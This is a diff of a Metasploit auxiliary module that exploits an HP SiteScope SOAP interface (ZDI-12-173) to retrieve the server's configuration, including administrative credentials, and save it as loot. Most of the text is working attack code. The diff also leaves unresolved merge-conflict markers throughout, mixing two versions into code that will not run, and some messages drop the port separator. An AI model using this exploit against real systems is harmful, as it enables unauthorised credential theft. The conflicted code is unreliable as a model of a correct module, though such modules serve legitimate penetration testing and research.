@@ -21,6 +21,7 @@ class Metasploit4 < Msf::Auxiliary
 				which allows to retrieve the HP SiteScope configuration, including administrative
 				credentials. It is accomplished by calling the getSiteScopeConfiguration operation
 				available through the APISiteScopeImpl AXIS service. The HP SiteScope Configuration
+<<<<<<< HEAD
 				is retrieved as file containing Java serialization data. This module has been
 				tested successfully on HP SiteScope 11.20 over Windows 2003 SP2 and Linux Centos
 				6.3.
@@ -28,6 +29,14 @@ class Metasploit4 < Msf::Auxiliary
 			'References'   =>
 				[
 					[ 'OSVDB', '85120' ],
+=======
+				is retrieved as a gzipped file containing Java serialization data. This module has
+				been tested successfully on HP SiteScope 11.20 over Windows 2003 SP2.
+			},
+			'References'   =>
+				[
+					#[ 'OSVDB', '' ],
+>>>>>>> Added module for ZDI-12-173
 					[ 'BID', '55269' ],
 					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-173/' ]
 				],
@@ -42,7 +51,11 @@ class Metasploit4 < Msf::Auxiliary
 		register_options(
 		[
 			Opt::RPORT(8080),
+<<<<<<< HEAD
 			OptString.new('TARGETURI', [true, 'Path to SiteScope', '/SiteScope/'])
+=======
+
+>>>>>>> Added module for ZDI-12-173
 		], self.class)
 
 		register_autofilter_ports([ 8080 ])
@@ -54,6 +67,7 @@ class Metasploit4 < Msf::Auxiliary
 	end
 
 	def run_host(ip)
+<<<<<<< HEAD
 		@peer = "#{rhost}:#{rport}"
 		@uri = target_uri.path
 		@uri << '/' if @uri[-1,1] != '/'
@@ -66,6 +80,14 @@ class Metasploit4 < Msf::Auxiliary
 
 		if not res
 			print_error("#{@peer} - Unable to connect")
+=======
+		res = send_request_cgi({
+			'uri'     => '/SiteScope/services/APISiteScopeImpl',
+			'method'  => 'GET'})
+
+		if not res
+			print_error("#{rhost}:#{rport} - Unable to connect")
+>>>>>>> Added module for ZDI-12-173
 			return
 		end
 
@@ -73,6 +95,10 @@ class Metasploit4 < Msf::Auxiliary
 	end
 
 	def access_configuration
+<<<<<<< HEAD
+=======
+		print_status("#{rhost}:#{rport} - Connecting to SiteScope SOAP Interface")
+>>>>>>> Added module for ZDI-12-173
 
 		data = "<?xml version='1.0' encoding='UTF-8'?>" + "\r\n"
 		data << "<wsns0:Envelope" + "\r\n"
@@ -89,10 +115,15 @@ class Metasploit4 < Msf::Auxiliary
 		data << "</wsns0:Body>" + "\r\n"
 		data << "</wsns0:Envelope>"
 
+<<<<<<< HEAD
 		print_status("#{@peer} - Retrieving the SiteScope Configuration")
 
 		res = send_request_cgi({
 			'uri'      => "#{@uri}services/APISiteScopeImpl",
+=======
+		res = send_request_cgi({
+			'uri'      => '/SiteScope/services/APISiteScopeImpl',
+>>>>>>> Added module for ZDI-12-173
 			'method'   => 'POST',
 			'ctype'    => 'text/xml; charset=UTF-8',
 			'data'     => data,
@@ -106,7 +137,11 @@ class Metasploit4 < Msf::Auxiliary
 				boundary = $1
 			end
 			if not boundary or boundary.empty?
+<<<<<<< HEAD
 				print_error("#{@peer} - Failed to retrieve the SiteScope Configuration")
+=======
+				print_error("#{rhost}#{rport} - Failed to retrieve the SiteScope Configuration")
+>>>>>>> Added module for ZDI-12-173
 				return
 			end
 
@@ -114,7 +149,11 @@ class Metasploit4 < Msf::Auxiliary
 				cid = $1
 			end
 			if not cid or cid.empty?
+<<<<<<< HEAD
 				print_error("#{@peer} - Failed to retrieve the SiteScope Configuration")
+=======
+				print_error("#{rhost}#{rport} - Failed to retrieve the SiteScope Configuration")
+>>>>>>> Added module for ZDI-12-173
 				return
 			end
 
@@ -122,17 +161,30 @@ class Metasploit4 < Msf::Auxiliary
 				loot = Rex::Text.ungzip($1)
 			end
 			if not loot or loot.empty?
+<<<<<<< HEAD
 				print_error("#{@peer} - Failed to retrieve the SiteScope Configuration")
+=======
+				print_error("#{rhost}#{rport} - Failed to retrieve the SiteScope Configuration")
+>>>>>>> Added module for ZDI-12-173
 				return
 			end
 
 			path = store_loot('hp.sitescope.configuration', 'application/octet-stream', rhost, loot, cid, "#{rhost} HP SiteScope Configuration")
+<<<<<<< HEAD
 			print_status("#{@peer} - HP SiteScope Configuration saved in #{path}")
 			print_status("#{@peer} - HP SiteScope Configuration is saved as Java serialization data")
 			return
 		end
 
 		print_error("#{@peer} - Failed to retrieve the SiteScope Configuration")
+=======
+			print_status("#{rhost}:#{rport} - HP SiteScope Configuration saved in #{path}")
+			print_status("#{rhost}:#{rport} - HP SiteScope Configuration is saved as Java serialization data")
+			return
+		end
+
+		print_error("#{rhost}#{rport} - Failed to retrieve the SiteScope Configuration")
+>>>>>>> Added module for ZDI-12-173
 	end
 
 end
